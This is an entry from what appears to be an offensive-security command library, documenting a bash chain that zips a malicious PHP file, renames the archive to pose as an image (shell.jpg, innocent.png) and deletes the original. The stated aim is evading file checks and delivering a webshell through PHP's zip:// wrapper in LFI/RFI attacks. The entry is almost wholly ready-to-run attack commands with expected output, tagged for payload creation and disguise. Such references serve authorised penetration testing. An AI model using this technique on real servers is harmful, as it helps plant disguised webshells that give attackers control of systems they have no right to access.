---
id: 9f357903-d5e6-441f-8e9c-9ddcdabd197a
name: create-disguised-zip-payload-with-bash
type: command
executor: bash
data: >-
  zip $_ARCHIVE_NAME $_PAYLOAD_FILE; mv $_ARCHIVE_NAME $_DISGUISED_NAME; rm
  $_PAYLOAD_FILE
output: null
created_at: '2023-04-06T03:55:58.351297+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - payload-creation
  - disguise
verified: true
validated: true
---

# create-disguised-zip-payload-with-bash

## Command

```bash
zip $_ARCHIVE_NAME $_PAYLOAD_FILE; mv $_ARCHIVE_NAME $_DISGUISED_NAME; rm $_PAYLOAD_FILE
```

## Description

This bash command chain creates a zip archive from a PHP payload file, renames the archive to mimic an image file (e.g., .jpg), and removes the original payload to aid in evasion during LFI/RFI attacks using PHP's zip:// wrapper.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ARCHIVE_NAME | Name for the temporary zip file (e.g., payload.zip) | Yes |
| $_PAYLOAD_FILE | Path to the malicious PHP file to archive (e.g., payload.php) | Yes |
| $_DISGUISED_NAME | Final disguised filename (e.g., shell.jpg) | Yes |

## Examples

### Basic Usage

```bash
zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php
```

### Advanced Usage

```bash
zip exploit.zip webshell.php; mv exploit.zip innocent.png; rm webshell.php
```

## Expected Output

The zip command outputs:

```
adding: payload.php (deflated 50%)
```

The mv and rm commands produce no output if successful. Verify the result with `file shell.jpg`, which should show: "shell.jpg: Zip archive data".

## Related

- [[procedures/Deliver-Payload-via-Zip-Wrapper-LFI-RFI]]
